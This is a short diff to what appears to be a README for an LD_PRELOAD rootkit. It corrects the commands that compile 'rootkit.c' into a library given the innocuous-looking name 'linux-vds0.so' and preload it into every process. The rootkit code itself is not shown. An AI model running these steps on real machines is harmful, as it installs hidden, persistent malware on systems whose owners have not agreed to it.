@@ -16,7 +16,7 @@
 # compile and load library:
 ```
 gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl
-export $(pwd)/linux-vds0.so 
+export LD_PRELOAD=$(pwd)/linux-vds0.so 
 ```
 
 # delete and unload library:
